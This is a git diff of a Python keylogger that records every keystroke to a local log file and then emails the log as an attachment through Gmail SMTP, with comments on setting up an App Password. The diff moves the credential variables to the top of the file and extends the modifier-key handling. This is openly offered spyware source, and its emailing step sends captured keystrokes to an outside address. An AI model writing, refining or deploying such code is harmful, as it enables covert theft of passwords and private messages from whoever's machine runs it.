@@ -4,13 +4,20 @@ import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
+# sender and recipient email addresses
+sender = ""
+recipient = ""
+
+# to get a password that you can use in Python enable 2FA in gmail
+# and generate an App Password
+password = ""
+
 # ensure log file is created in the same directory as this python script
 
 directory_path = os.path.dirname(os.path.abspath(__file__))
 file_path = os.path.join(directory_path, "log.txt")
 
 # keylogger
-
 
 def write_log(line):
     with open(file_path, "a") as file:
@@ -38,9 +45,13 @@ def on_release(Key):
     if (
         Key == keyboard.Key.shift_r
         or Key == keyboard.Key.shift
+        or Key == keyboard.Key.shift_l
         or Key == keyboard.Key.ctrl
         or Key == keyboard.Key.ctrl_r
+        or Key == keyboard.Key.ctrl_l
         or Key == keyboard.Key.alt
+        or Key == keyboard.Key.alt_l
+        or Key == keyboard.Key.alt_r
         or Key == keyboard.Key.cmd
         or Key == keyboard.Key.alt_gr
     ):
@@ -58,14 +69,6 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
 
 # send email with log file attached
 # the following code will run after keylogger stops
-
-# sender and recipient email addresses
-sender = ""
-recipient = ""
-
-# to get a password that you can use in Python enable 2FA in gmail
-# and generate an App Password
-password = ""
 
 subject = "Keylogger Log"
 body = "keylogger log attached"
